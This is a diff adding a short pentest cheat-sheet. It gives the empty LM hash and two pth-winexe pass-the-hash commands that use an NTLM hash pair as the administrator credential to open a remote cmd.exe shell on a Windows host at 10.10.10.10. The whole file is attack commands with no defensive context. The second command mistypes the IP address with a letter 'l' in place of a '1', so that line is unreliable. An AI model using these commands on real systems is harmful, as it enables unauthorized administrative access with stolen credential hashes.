@@ -1,0 +1,10 @@
+# Empty LM hash
+aad3b435b51404eeaad3b435b51404ee
+
+# pth-winexe
+export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
+pth-winexe -U administrator% //10.10.10.10 cmd.exe
+
+# pth-winexe
+pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896 //10.10.l0.10 cmd.exe
+
